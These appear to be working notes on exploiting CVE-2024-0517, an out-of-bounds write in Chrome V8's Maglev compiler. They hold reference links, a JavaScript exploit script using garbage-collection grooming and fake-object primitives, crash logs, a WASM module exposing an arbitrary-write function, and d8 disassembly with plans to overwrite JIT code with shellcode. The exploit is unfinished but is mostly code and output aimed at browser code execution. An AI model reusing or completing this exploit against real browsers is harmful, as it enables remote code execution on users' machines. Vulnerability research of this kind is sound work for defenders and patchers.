### Maglev

https://www.matteomalvica.com/blog/2024/06/05/intro-v8-exploitation-maglev/

https://github.blog/security/vulnerability-research/getting-rce-in-chrome-with-incomplete-object-initialization-in-the-maglev-compiler/

https://blog.exodusintel.com/2024/01/19/google-chrome-v8-cve-2024-0517-out-of-bounds-write-code-execution/

https://cwresearchlab.co.kr/entry/CVE-2024-0517-Out-of-Bounds-Write-in-V8

https://h0meb0dy.me/entry/CVE-2024-0517-Out-of-Bounds-Write-in-V8

### Garbage Collection!

https://www.googleapis.com/download/storage/v1/b/v8-asan/o/linux-debug%2Fd8-linux-debug-v8-component-91690.zip?generation=1704463292714663&alt=media

https://blog.frontend-almanac.com/v8-garbage-collection

https://fe-developers.kakaoent.com/2022/220519-garbage-collection/

https://docs.google.com/document/d/13CwgSL4yawxuYg3iNlM-4ZPCB8RgJya6b8H_E2F-Aek/edit#heading=h.djws22xta9wz

https://github.com/Uniguri/CVE-nday/tree/master/Chrome/V8/CVE-2024-0517

### Exploitation Tecnique: FakeObject

```
let arb = new ArrayBuffer(0x8)
let u64 = new BigUint64Array(arb)
let f64 = new Float64Array(arb)
/*
var wasm_code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x09, 0x02, 0x60,  0x00, 0x00, 0x60, 0x02, 0x7f, 0x7e, 0x00, 0x03, 0x05, 0x04, 0x00, 0x00,  0x01, 0x00, 0x05, 0x03, 0x01, 0x00, 0x01, 0x07, 0x22, 0x04, 0x03, 0x6e,  0x6f, 0x70, 0x00, 0x00, 0x04, 0x6e, 0x6f, 0x70, 0x32, 0x00, 0x01, 0x09,  0x61, 0x72, 0x62, 0x5f, 0x77, 0x72, 0x69, 0x74, 0x65, 0x00, 0x02, 0x05,  0x73, 0x68, 0x65, 0x6c, 0x6c, 0x00, 0x03, 0x0a, 0x29, 0x04, 0x03, 0x00,  0x01, 0x0b, 0x15, 0x00, 0x01, 0x41, 0x00, 0x41, 0xad, 0xbd, 0x03, 0x36,  0x02, 0x00, 0x41, 0x01, 0x41, 0xad, 0xbd, 0x03, 0x36, 0x02, 0x00, 0x0b,  0x09, 0x00, 0x20, 0x00, 0x20, 0x01, 0x37, 0x03, 0x00, 0x0b, 0x03, 0x00,  0x01, 0x0b
]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var { shell, arb_write, nop, nop2 } = wasm_instance.exports;
*/
function itof(_integer) {
	u64[0] = _integer
	return f64[0]
}

function ftoi(_float) {
	f64[0] = _float
	return u64[0]
}


let index = 0x30;
var addrOf_LO = new Array(0x3000);
for(var i = 0;i< index;i++) addrOf_LO[i]=1.1; // dont use bigint, cuz bigint is a JavaScript object lol
/*
while(index < 0x100){
    addrOf_LO[index+1] = wasm_instance;
    addrOf_LO[index+2] = wasm_instance;
    addrOf_LO[index+3] = wasm_instance;
    addrOf_LO[index+0] = wasm_instance;
    index += 4;
}
*/
%DebugPrint(addrOf_LO)


class C2 {
}
var corrupted_arr = [1.1];

function gc() {
    new ArrayBuffer(0x4fe00000);
}



function newgc() {
        for (var i = 0; i < 8; i++) {
            new ArrayBuffer(0x200000);
        }
        new ArrayBuffer(8);
}




class C3 extends C2 {
    constructor(obj) {
        try { new.target(); } catch (e) {}
        super();
        const v12 = new Array(32);
        const v14 = new Array(64);
        // %DebugPrint(v12);
            for (let v13 = 0; v13 < 2; v13++) {
                if(!v13) {
                    gc();
                    gc();

                    gc();
                    gc();
                    gc();
                    gc();
                    
                    //newgc();
                    let fake_object_array = [
                    	itof(0x4141414143434343n),
                    	itof(0x000006a50018ee65n), // 18ee25 18eee5
                    	itof(0x0000200044444441n), 
                    	itof(0x4d4d4d4d4f4f4f4fn),
            	    ];

                } 
                else{
                    obj.c = v12;
                    obj.e = corrupted_arr; 
                    obj.d = v14 ;
                }

            }
        %OptimizeMaglevOnNextCall(C3);
        
       
       
    }
}

let obj = {a: [], c: "a" };

new C3(obj);
new C3(obj);
new C3(obj);

%DebugPrint(obj.d);

for (let ii = 0; ii < 0x1000; ii+=1) {
	if (obj.d[ii] === 1.1) {
		console.log("[+] We have found the marker!????????????")
		break
	}
}
```

- no wasm can trigger the exploit with 2 gcs 

    Received signal 11 SEGV_ACCERR ??????44444440

- with wasm cannot trigger the exploit with 2 gcs, need 4 GCs and the ordering will fk up 

    Received signal 11 SEGV_ACCERR ??????41414144

- with wasm can trigger with 1 supergc

    Received signal 11 SEGV_ACCERR ??????44444440


wasm_instance -> wasm_memory_objects -> wasm_memory_object -> baking store (where we write to)

what the exploit does at the end

shell() <- we need to set the shellcode over here i guess

(module
  (memory $memory0 1)
  (func $nop (;0;) (export "nop")
    nop
  )
  (func $nop2 (;1;) (export "nop2")
    nop
    i32.const 0
    i32.const 57005
    i32.store
    i32.const 1
    i32.const 57005
    i32.store
  )
  (func $arb_write (;2;) (export "arb_write") (param $var0 i32) (param $var1 i64)
    local.get $var0
    local.get $var1
    i64.store
  )
  (func $shell (;3;) (export "shell")
    nop
  )
)

Source positions:
 pc offset  position
        46         0  statement
        52        20  statement

Safepoints (entries = 1, byte size = 10)
0x2cf5c10ebc4b     4b  slots (sp->fp): 00000000

RelocInfo (size = 0)

--- End code ---


Protected instructions:
 pc offset
        23         

Source positions:
 pc offset  position
        23         5  statement
        3d         0  statement
        4d         8  statement

Safepoints (entries = 1, byte size = 11)
0x2cf5c10ebca3     23  slots (sp->fp): 0000000000000000

RelocInfo (size = 0)

--- End code ---
--- WebAssembly code ---
name: wasm-function[3]
index: 3
kind: wasm function
compiler: Liftoff
Body (size = 128 = 80 + 48 padding)
Instructions (size = 68)
0x2cf5c10ebd00     0  55                   push rbp
0x2cf5c10ebd01     1  4889e5               REX.W movq rbp,rsp
0x2cf5c10ebd04     4  6a08                 push 0x8
0x2cf5c10ebd06     6  56                   push rsi
0x2cf5c10ebd07     7  4881ec10000000       REX.W subq rsp,0x10
0x2cf5c10ebd0e     e  493b65a0             REX.W cmpq rsp,[r13-0x60]
0x2cf5c10ebd12    12  0f8614000000         jna 0x2cf5c10ebd2c  <+0x2c>
0x2cf5c10ebd18    18  4c8b5677             REX.W movq r10,[rsi+0x77]
0x2cf5c10ebd1c    1c  41836a0c18           subl [r10+0xc],0x18
0x2cf5c10ebd21    21  0f8810000000         js 0x2cf5c10ebd37  <+0x37>
0x2cf5c10ebd27    27  488be5               REX.W movq rsp,rbp
0x2cf5c10ebd2a    2a  5d                   pop rbp
0x2cf5c10ebd2b    2b  c3                   retl
0x2cf5c10ebd2c    2c  e8cff5ffff           call 0x2cf5c10eb300  (jump table)
0x2cf5c10ebd31    31  488b75f0             REX.W movq rsi,[rbp-0x10]
0x2cf5c10ebd35    35  ebe1                 jmp 0x2cf5c10ebd18  <+0x18>
0x2cf5c10ebd37    37  e824f4ffff           call 0x2cf5c10eb160  (jump table)
0x2cf5c10ebd3c    3c  488b75f0             REX.W movq rsi,[rbp-0x10]
0x2cf5c10ebd40    40  ebe5                 jmp 0x2cf5c10ebd27  <+0x27>
0x2cf5c10ebd42    42  6690                 nop

Source positions:
 pc offset  position
        2c         0  statement
        37         2  statement

Safepoints (entries = 1, byte size = 10)
0x2cf5c10ebd31     31  slots (sp->fp): 00000000

RelocInfo (size = 0)

--- End code ---
V8 version 12.0.267.14
d8> 


0x2cf5c10ebb9c    1c  41832a18             subl [r10],0x18 nop()

0x2cf5c10ebc36    36  41836a0432           subl [r10+0x4],0x32 nop2()

0x2cf5c10ebd00     0  55                   push rbp (start of shellcode, hence start writing here)



0x2cf5c10ebc98    18  488b4e27             REX.W movq rcx,[rsi+0x27] <- screw with this so rcx is 0x0

                      448b4e27             mov    r9d,DWORD PTR [rsi+0x27]

0x2cf5c10ebc9c    1c  48c1e918             REX.W shrq rcx, 24 <- need to screw with this

                      48c1e718             shl    rdi,0x18

0x2cf5c10ebca0    20  4903ce               REX.W addq rcx,r14 <- need to screw with this
                      
                      4831c9               xor rcx, rcx

                      903ce?
                      
0x2cf5c10ebca3    23  48891401             REX.W movq [rcx+rax*1],rdx

We need to construct a primitive which gives is sub [], 0x2

(gdb) x/1gx 0x363628577000+0xc36
0x363628577c36:	0x10880f32046a8341
(gdb) x/1gx 0x363628577000+0xc36+0x4
0x363628577c3a:	0x4800000010880f32


Take screenshots of WASM Memory stuff

memory_objects

memory0_start

note down what arb_write does